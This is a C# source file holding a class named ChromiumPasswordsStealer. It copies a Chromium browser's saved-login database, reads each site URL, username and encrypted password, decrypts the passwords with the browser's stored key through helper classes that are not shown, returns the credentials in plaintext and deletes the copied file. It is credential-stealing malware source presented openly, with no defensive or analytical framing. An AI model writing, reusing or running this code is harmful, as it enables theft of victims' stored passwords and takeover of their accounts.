using System;
using System.Collections.Generic;
using System.Data.SQLite;
using System.IO;
using System.Security.Cryptography;
using System.Text;

public class ChromiumPasswordsStealer
{
    public static List<CredentialModel> GetPasswords(string path, string keyPath)
    {
        if (!System.IO.File.Exists(path))
        {
            return new List<CredentialModel>();
        }

        if (!System.IO.File.Exists(keyPath))
        {
            return new List<CredentialModel>();
        }

        path = FileUtils.CopyFile(path);
        List<CredentialModel> result = new List<CredentialModel>();

        if (File.Exists(path))
        {
            using (var conn = new SQLiteConnection($"Data Source={path};"))
            {
                conn.Open();

                using (var cmd = conn.CreateCommand())
                {
                    cmd.CommandText = "SELECT action_url, username_value, password_value FROM logins";

                    using (var reader = cmd.ExecuteReader())
                    {
                        if (reader.HasRows)
                        {
                            var key = ChromiumDecryptor.GetKey(keyPath);

                            while (reader.Read())
                            {
                                byte[] nonce, ciphertextTag;
                                var encryptedData = SQLUtils.GetBytes(reader, 2);
                                ChromiumDecryptor.Prepare(encryptedData, out nonce, out ciphertextTag);
                                var pass = ChromiumDecryptor.Decrypt(ciphertextTag, key, nonce);

                                result.Add(new CredentialModel()
                                {
                                    Url = reader.GetString(0),
                                    Username = reader.GetString(1),
                                    Password = pass
                                });
                            }
                        }
                    }
                }

                conn.Close();
                conn.Dispose();
            }
        }

        System.IO.File.Delete(path);
        return result;
    }
}